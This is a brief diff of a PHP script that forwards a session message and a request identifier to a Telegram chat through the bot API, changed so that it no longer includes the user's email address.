@@ -10,7 +10,7 @@ $chatId = $CHAT_ID;
 $url = "https://api.telegram.org/bot$botToken/sendMessage";
 $data = [
     'chat_id' => $chatId,
-    'text' => "✅ New message\n" . $_SESSION["email"] . "\n\n--------------\n\n" . $_SESSION["message"] . "\n\n--------------\n\n" . $_GET["identifier"]
+    'text' => "✅ New message\n\n" . $_SESSION["message"] . "\n\n--------------\n\n" . $_GET["identifier"]
 ];
 
 $ch = curl_init();
